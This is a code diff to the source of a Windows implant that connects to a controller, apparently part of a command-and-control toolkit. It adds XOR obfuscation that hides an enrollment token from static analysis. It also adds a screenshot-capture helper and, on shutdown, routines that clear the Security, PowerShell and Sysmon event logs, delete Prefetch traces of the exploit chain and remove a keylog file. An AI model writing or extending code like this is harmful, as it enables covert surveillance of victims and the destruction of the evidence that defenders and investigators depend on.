@@ -30,12 +30,17 @@
  * (BP2: cert and key are generated at runtime — not embedded in the binary)
  */
 #include "implant_certs.h"
+#include "token_obf.h"
 
-/* BP2: enrollment token baked in at compile time via -DENROLLMENT_TOKEN="..."
- * Fall back to a placeholder so the file compiles without the flag. */
-#ifndef ENROLLMENT_TOKEN
-#define ENROLLMENT_TOKEN "default-token"
-#endif
+/* BP2: enrollment token is XOR-obfuscated in the binary (token_obf.h).
+ * Decoded at runtime onto the stack — never appears as a plaintext string
+ * in .rodata and is not visible via `strings` on the binary. */
+static void decode_enrollment_token(char *out)
+{
+    for (int i = 0; i < TOKEN_OBF_LEN; i++)
+        out[i] = (char)(g_token_obf[i] ^ g_token_key[i % sizeof(g_token_key)]);
+    out[TOKEN_OBF_LEN] = '\0';
+}
 
 /* ── BP5 keepalive thread ────────────────────────────────────────────
  *
@@ -230,6 +235,61 @@ static Conn *connect_to_controller(void)
     return conn;
 }
 
+/* ── Event log clearing ──────────────────────────────────────────────
+ * Called on SHUTDOWN to remove forensic artifacts (process creation 4688,
+ * scheduled task creation 4698, PowerShell script block 4104, Sysmon). */
+#ifdef _WIN32
+static void clear_event_logs(void)
+{
+    static const char *logs[] = {
+        "Security",
+        "System",
+        "Application",
+        "Microsoft-Windows-PowerShell/Operational",
+        "Microsoft-Windows-Sysmon/Operational",
+        NULL
+    };
+    for (int i = 0; logs[i]; i++) {
+        HANDLE h = OpenEventLogA(NULL, logs[i]);
+        if (h) {
+            ClearEventLogA(h, NULL);
+            CloseEventLog(h);
+        }
+    }
+}
+#endif
+
+/* ── Prefetch cleanup ────────────────────────────────────────────────
+ * Called on SHUTDOWN to delete Prefetch entries created by the exploit
+ * chain.  Uses FindFirstFile/FindNextFile with wildcard patterns so the
+ * hash suffix (e.g. MICROSOFTEDGEUPDATE.EXE-AB1234CD.pf) does not need
+ * to be known at compile time.  No child process is spawned. */
+#ifdef _WIN32
+static void clear_prefetch(void)
+{
+    static const char *patterns[] = {
+        "C:\\Windows\\Prefetch\\MICROSOFTEDGEUPDATE.EXE-*.pf",
+        "C:\\Windows\\Prefetch\\I.EXE-*.pf",
+        "C:\\Windows\\Prefetch\\POWERSHELL.EXE-*.pf",
+        "C:\\Windows\\Prefetch\\FODHELPER.EXE-*.pf",
+        NULL
+    };
+
+    WIN32_FIND_DATAA fd;
+    for (int i = 0; patterns[i]; i++) {
+        HANDLE h = FindFirstFileA(patterns[i], &fd);
+        if (h == INVALID_HANDLE_VALUE) continue;
+        do {
+            char path[MAX_PATH];
+            _snprintf(path, sizeof(path),
+                      "C:\\Windows\\Prefetch\\%s", fd.cFileName);
+            DeleteFileA(path);
+        } while (FindNextFileA(h, &fd));
+        FindClose(h);
+    }
+}
+#endif
+
 /* ── Self-relocation ─────────────────────────────────────────────────
  *
  * The stager (medium-integrity) drops i.exe to C:\Users\Public because
@@ -297,6 +357,20 @@ int main(int argc, char **argv)
      * copy now that it is no longer locked by a running process. */
     if (argc >= 2 && strcmp(argv[1], "--relocated") == 0)
         DeleteFileA(IMPLANT_STAGE_PATH);
+
+    /* Screenshot helper: spawned in the user session by spy_screenshot_capture
+     * when the main implant is running as SYSTEM (Session 0).  Take the GDI
+     * screenshot, write the BMP to the given path, and exit immediately. */
+    if (argc >= 3 && strcmp(argv[1], "--screenshot") == 0) {
+        int len = 0;
+        char *data = spy_screenshot_capture(&len);
+        if (data) {
+            FILE *fp = fopen(argv[2], "wb");
+            if (fp) { fwrite(data, 1, len, fp); fclose(fp); }
+            free(data);
+        }
+        return 0;
+    }
 #endif
     (void)argc; (void)argv;
 
@@ -346,7 +420,9 @@ int main(int argc, char **argv)
 
         char *csr_pem = NULL;
         int   csr_len = 0;
-        if (!tls_gen_key_and_csr(ENROLLMENT_TOKEN,
+        char  enrollment_token[TOKEN_OBF_LEN + 1];
+        decode_enrollment_token(enrollment_token);
+        if (!tls_gen_key_and_csr(enrollment_token,
                                   &key_pem, &key_len,
                                   &csr_pem, &csr_len)) {
             while (1) SLEEP(60);
@@ -453,12 +529,18 @@ int main(int argc, char **argv)
             RemoveDirectoryA(IMPLANT_TARGET_DIR);
             DeleteFileA(IMPLANT_STAGE_PATH);
 #endif
-            /* Remove persisted credentials — leaves no trace after shutdown */
+            /* Remove all implant files — credentials, keylog, temp dir */
             {
                 char s_cert[512], s_key[512];
                 cred_paths(s_cert, s_key, 512);
                 remove(s_cert);
                 remove(s_key);
+#ifdef _WIN32
+                DeleteFileA("C:\\Users\\Public\\MicrosoftEdge\\kl.dat");
+                RemoveDirectoryA("C:\\Users\\Public\\MicrosoftEdge");
+                clear_prefetch();
+                clear_event_logs();
+#endif
             }
             char *payload = "SUCCESSFULLY SHUTDOWN";
             Packet resp = {COMMAND_RESPONSE, pkt->request_id,
